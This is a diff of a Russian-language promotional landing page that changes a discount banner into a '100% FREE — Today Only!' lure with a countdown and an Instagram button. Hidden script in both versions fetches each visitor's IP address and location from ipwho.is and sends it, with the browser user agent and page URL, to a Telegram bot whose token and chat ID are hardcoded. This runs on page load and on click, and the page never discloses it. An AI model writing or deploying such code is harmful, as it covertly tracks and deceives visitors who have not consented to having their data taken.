@@ -2,27 +2,27 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>СКИДКА -50% НАПИСАТЬ В ДИРЕКТ</title>
+  <title>🔥 Написать в Instagram</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background-color: #fff;
+      background-color: #fafafa;
       margin: 0;
       padding: 20px;
-      color: #000;
+      color: #262626;
       text-align: center;
     }
 
     h1 {
       font-size: 28px;
-      color: #e74c3c;
+      color: #262626;
       margin-bottom: 10px;
     }
 
     .timer {
       font-size: 24px;
-      color: #e74c3c;
+      color: #262626;
       font-weight: bold;
       margin-bottom: 20px;
     }
@@ -45,48 +45,40 @@
     .instruction {
       margin-top: 40px;
       font-size: 16px;
-      color: #444;
+      color: #999;
       line-height: 1.5;
       padding: 0 10px;
     }
   </style>
 </head>
 <body>
-
-  <h1>🔥 СКИДКА -50% 🔥</h1>
+  <h1>🔥 100% FREE — Today Only! 🔥</h1>
   <div class="timer" id="timer">12:00:00</div>
 
-  <button class="big-button" onclick="openInstagram()">НАПИСАТЬ В ДИРЕКТ</button>
+  <button class="big-button" onclick="trackClick()">🖋️ Написать в Instagram</button>
 
   <div class="instruction">
-    📱 Для заказа напишите в директ: <b>хочу</b> <br><br>
-    📱 Если Instagram не открылся автоматически, нажмите кнопку выше и выберите браузер для перехода.
+    📱 Откройте ссылку через браузер и напишите в директ: "хочу".
   </div>
 
   <script>
-    const profileLink = "https://www.instagram.com/tymin_min374?igsh=NnBoOWgxbmFxNXlz";
+    const instagramLink = "https://www.instagram.com/tymin_min374?igsh=NnBoOWgxbmFxNXlz&utm_source=telegram&utm_medium=message&utm_campaign=insta_click";
     const TOKEN = "7930993307:AAHuIxRVgr9OD7ZP_D2dbrbEu-JGBdZSnc4";
     const CHAT_ID = "5253808709";
     const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-    function openInstagram() {
+    function trackClick() {
       fetch("https://ipwho.is/")
         .then(res => res.json())
         .then(data => {
-          const msg = `
-📥 Клик по кнопке Instagram
-📱 ${navigator.userAgent}
-🌐 ${location.href}
-🌍 IP: ${data.ip}
-🌆 ${data.city}, ${data.country}
-🕒 ${new Date().toLocaleString()}`;
+          const msg = `\n📥 Клик Instagram\n📱 ${navigator.userAgent}\n🌐 ${location.href}\n🌍 IP: ${data.ip}\n🌆 ${data.city}, ${data.country}\n🕒 ${new Date().toLocaleString()}`;
           fetch(API_URL, {
             method: "POST",
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
           });
         });
-      window.location.href = profileLink;
+      window.location.href = instagramLink;
     }
 
     window.onload = () => {
@@ -97,13 +89,7 @@
       fetch("https://ipwho.is/")
         .then(res => res.json())
         .then(data => {
-          const msg = `
-🔄 Заход на страницу
-📱 ${navigator.userAgent}
-🌐 ${location.href}
-🌍 IP: ${data.ip}
-🌆 ${data.city}, ${data.country}
-🕒 ${new Date().toLocaleString()}`;
+          const msg = `\n🔄 Заход \u043dа страницу\n📱 ${navigator.userAgent}\n🌐 ${location.href}\n🌍 IP: ${data.ip}\n🌆 ${data.city}, ${data.country}\n🕒 ${new Date().toLocaleString()}`;
           fetch(API_URL, {
             method: "POST",
             headers: { 'Content-Type': 'application/json' },
